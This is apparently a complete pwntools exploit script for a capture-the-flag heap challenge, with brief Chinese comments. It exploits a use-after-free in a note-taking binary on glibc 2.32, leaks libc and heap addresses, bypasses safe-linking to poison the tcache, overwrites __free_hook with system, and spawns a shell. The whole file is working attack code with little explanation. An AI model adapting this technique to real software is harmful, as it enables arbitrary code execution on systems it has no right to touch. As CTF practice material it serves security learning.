#unsortedbin attack + safelinking绕过     2.32版本
#delete导致的UAF漏洞
from pwn import*
p=process('./pwn')
# p=remote('ctf.npusec.org.cn',10776)
context.log_level='debug'
libc=ELF('./libc.so.6')
elf=ELF('./pwn')

def create(name,code):
    p.sendlineafter('> ',b'1')
    p.sendlineafter('用户名: ',str(name).encode())
    p.sendlineafter('密码: ',str(code).encode())

def login(name,code):
    p.sendlineafter('> ',b'2')
    p.sendlineafter('用户名: ',str(name).encode())
    p.sendlineafter('密码: ',str(code).encode())

def add(size):
    p.sendlineafter('> ',b'1')
    p.sendlineafter('笔记大小 (0 ~ 0x500):',str(size).encode())

def edit(content):
    p.sendlineafter('> ',b'2')
    p.sendlineafter('内容:',content)

def delete():
    p.sendlineafter('> ',b'3')

def show():
    p.sendlineafter('> ',b'4')

def logout():
    p.sendlineafter('> ',b'5')

# gdb.attach(p,"""
# b*malloc
# b*free
# b* $rebase(0x19cb)
# b* $rebase(0x1b33)           
# """)
# pause()
for i in range(15):
    create(i,i)
for i in range(9):
    login(i,i)
    add(0x90)
    logout()
for i in range(7):
    login(i,i)
    delete()
    logout()

login(7,7)
delete()
show()
leak=u64(p.recv(6).ljust(8,b'\x00'))
print('leak:'+hex(leak))
libc_base=leak-0x1e3c00
system_addr=libc_base+libc.sym['system']
print('libc_base:'+hex(libc_base))
print('system_addr:'+hex(system_addr))
binsh_addr=libc_base+next(libc.search(b'/bin/sh\x00'))
print('binsh_addr:'+hex(binsh_addr))
free_hook=libc_base+libc.sym['__free_hook']
print('free_hook:'+hex(free_hook))
logout()

login(9,9)
add(0x70)
logout()
login(10,10)
add(0x70)
logout()
login(9,9)
delete()
show()
leak=u64(p.recv(6).ljust(8,b'\x00'))
heap_base=leak<<12
print('heap_base'+hex(heap_base))
free_hook1=heap_base>>12^free_hook
logout()
login(10,10)
delete()
payload=p64(free_hook1)
edit(payload)
logout()

login(11,11)
add(0x70)
logout()
login(12,12)
add(0x70)
edit(p64(system_addr))
logout()
login(13,13)
add(0x70)
payload=b'/bin/sh\x00'
edit(payload)
delete()
p.interactive()